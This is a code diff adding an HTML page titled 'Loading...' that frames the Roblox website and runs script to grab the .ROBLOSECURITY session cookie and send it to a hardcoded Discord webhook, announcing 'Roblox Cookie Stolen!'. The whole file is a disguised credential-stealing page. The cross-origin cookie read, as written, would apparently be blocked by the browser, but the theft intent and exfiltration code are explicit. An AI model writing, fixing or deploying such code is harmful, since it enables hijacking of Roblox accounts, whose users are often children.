@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body { margin: 0; padding: 0; }
+        iframe { width: 100vw; height: 100vh; border: none; }
+    </style>
+</head>
+<body>
+    <!-- Embed Roblox -->
+    <iframe id="robloxi" src="https://www.roblox.com/" allowfullscreen></iframe>
+
+    <script>
+        // Wait for Roblox to load inside the iframe
+        setTimeout(() => {
+            const iframe = document.getElementById('robloxi');
+            
+            // Try to access the cookie from the iframe's context
+            try {
+                // Access the document inside the iframe
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                
+                // Get all cookies
+                const cookies = iframe.contentWindow.document.cookie;
+                
+                // Extract .ROBLOSECURITY
+                const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+                
+                if (match) {
+                    const robloxCookie = match[1];
+                    
+                    // Send to Discord Webhook
+                    fetch("https://discord.com/api/webhooks/1568842658024128713/zVUKHWdpx3qKNuQnzxrA86Rs-2dN_tYz8HsXV37ImSW8X1RxS1LBb1IyTQy0bSRxdbxn", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "🍪 **Roblox Cookie Stolen!**\n```" + robloxCookie + "```"
+                        })
+                    }).then(() => {
+                        alert("Cookie captured! Check Discord.");
+                    }).catch(err => {
+                        console.error("Error:", err);
+                        alert("Failed to send cookie.");
+                    });
+                } else {
+                    alert("No .ROBLOSECURITY cookie found. Make sure you're logged into Roblox!");
+                }
+            } catch (e) {
+                alert("Cross-origin error: " + e.message);
+            }
+        }, 5000); // Wait 5 seconds for Roblox to fully load
+    </script>
+</body>
+</html>
